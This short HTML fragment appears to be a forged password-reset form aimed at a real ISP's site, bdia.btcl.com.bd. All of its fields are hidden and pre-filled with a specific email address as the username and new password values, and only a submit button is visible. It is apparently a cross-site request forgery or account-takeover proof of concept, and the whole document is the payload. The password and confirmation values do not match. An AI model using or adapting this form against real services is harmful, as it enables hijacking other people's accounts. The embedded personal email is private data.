<body class=" login">


<!-- BEGIN LOGIN -->
<div class="content">

    <form action="http://bdia.btcl.com.bd/ForgetPassword.do?method=forgetPassword">


        <input type="hidden" name="method" value="resetPassword" />

        <input type="hidden" name="formSubmitted" value="" />

        <input type="hidden" name="identifierGiven" value="email" />
        <input type="hidden" name="username" value="Umairali_256@outlook.com" />


        <div class="form-group">

            <input name="password" type="hidden" id="password" value="yeahok" />
            <div style="margin-top: 5px;" class="pwstrength_viewport_progress"></div>
        </div>
        <div class="form-group">

            <input name="rePassword" type="hidden" value="um123" />
        </div>
        <input type="hidden" name="_token" id="csrf-token" value="{{csrf_token()}}" />
        <div class="margin-top-10">
            <input name="type" value="password" type="hidden">
            <input type="submit" class="btn green-jungle uppercase" value=" submit" />
        </div>

    </form>
</div>
